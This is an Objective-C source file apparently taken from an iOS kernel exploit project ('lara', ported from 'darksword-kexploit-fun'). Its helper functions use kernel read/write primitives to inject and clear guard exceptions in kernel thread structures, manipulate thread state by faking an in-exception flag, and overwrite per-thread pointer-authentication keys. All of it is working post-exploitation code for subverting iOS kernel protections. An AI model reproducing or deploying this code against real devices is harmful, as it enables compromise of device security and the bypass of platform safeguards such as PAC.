//
//  thread.m
//  lara
//
//  Ported from darksword-kexploit-fun
//  Original by seo on 4/4/26.
//

#import "thread.h"

#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import "darksword.h"
#import "utils.h"
#import "offsets.h"

// xnu-10002.81.5/osfmk/kern/ast.h
#define AST_GUARD               0x1000

// xnu-10002.81.5/osfmk/kern/thread.h
#define TH_IN_MACH_EXCEPTION    0x8000

// xnu-11417.140.69/bsd/sys/reason.h
#define OS_REASON_GUARD         23

bool injectguardexc(uint64_t thread, uint64_t code) {
    if (!thread_get_t_tro(thread)) {
        printf("(thread) invalid tro, skipping exception injection as thread is dead\n");
        return false;
    }
    
    if(SYSTEM_VERSION_GREATER_THAN_OR_EQUAL_TO(@"18.4")) {
        ds_kwrite32(thread + off_thread_mach_exc_info_os_reason, OS_REASON_GUARD);
        ds_kwrite32(thread + off_thread_mach_exc_info_exception_type, 0);
        ds_kwrite64(thread + off_thread_mach_exc_info_code, code);
    } else {
        ds_kwrite64(thread + off_thread_guard_exc_info_code, code);
    }
    
    uint32_t ast = ds_kread32(thread + off_thread_ast);
    ast |= AST_GUARD;
    ds_kwrite32(thread + off_thread_ast, ast);
    return true;
}

void clearguardexc(uint64_t thread) {
    if (!thread_get_t_tro(thread)) {
        printf("(thread) invalid tro, still clearing to avoid crash\n");
    }

    uint32_t ast = ds_kread32(thread + off_thread_ast);
    ast &= ~AST_GUARD | 0x80000000;
    ds_kwrite32(thread + off_thread_ast, ast);
    
    if(SYSTEM_VERSION_GREATER_THAN_OR_EQUAL_TO(@"18.4")) {
        if(ds_kread32(thread + off_thread_mach_exc_info_os_reason) == OS_REASON_GUARD && ds_kread32(thread + off_thread_mach_exc_info_exception_type) == 0) {
            ds_kwrite32(thread + off_thread_mach_exc_info_os_reason, 0);
            ds_kwrite32(thread + off_thread_mach_exc_info_exception_type, 0);
            ds_kwrite64(thread + off_thread_mach_exc_info_code, 0);
        }
    } else {
        ds_kwrite64(thread + off_thread_guard_exc_info_code, 0);
    }
}

bool threadgetstate(mach_port_t machthread, arm_thread_state64_internal *outstate) {
    mach_msg_type_number_t count = ARM_THREAD_STATE64_COUNT;
    kern_return_t kr = thread_get_state(machthread, ARM_THREAD_STATE64, (thread_state_t)outstate, &count);
    
    if (kr != KERN_SUCCESS) {
        printf("(thread) unable to read thread state: 0x%x (%s)\n", kr, mach_error_string(kr));
        return false;
    }
    
    return true;
}

bool threadsetstate(mach_port_t machthread, uint64_t threadaddr, arm_thread_state64_internal *state) {
    uint16_t options = 0;
    if (threadaddr) {
        options = thread_get_options(threadaddr);
        options |= TH_IN_MACH_EXCEPTION;
        thread_set_options(threadaddr, options);
    }

    kern_return_t kr = thread_set_state(machthread, ARM_THREAD_STATE64, (thread_state_t)state, ARM_THREAD_STATE64_COUNT);
    if (kr != KERN_SUCCESS) {
        printf("(thread) Failed thread_set_state: 0x%x (%s)\n", kr, mach_error_string(kr));
        return false;
    }

    if (threadaddr) {
        options &= ~TH_IN_MACH_EXCEPTION;
        thread_set_options(threadaddr, options);
    }
    
    return true;
}

bool threadresume(mach_port_t machthread) {
    kern_return_t kr = thread_resume(machthread);
    
    if (kr != KERN_SUCCESS) {
        printf("(thread) Unable to resume thread: 0x%x (%s)\n", kr, mach_error_string(kr));
        return false;
    }
    
    return true;
}

void threadsetpac(uint64_t threadaddr, uint64_t keya, uint64_t keyb) {
    ds_kwrite64(threadaddr + off_thread_machine_rop_pid, keya);
    ds_kwrite64(threadaddr + off_thread_machine_jop_pid, keyb);
}
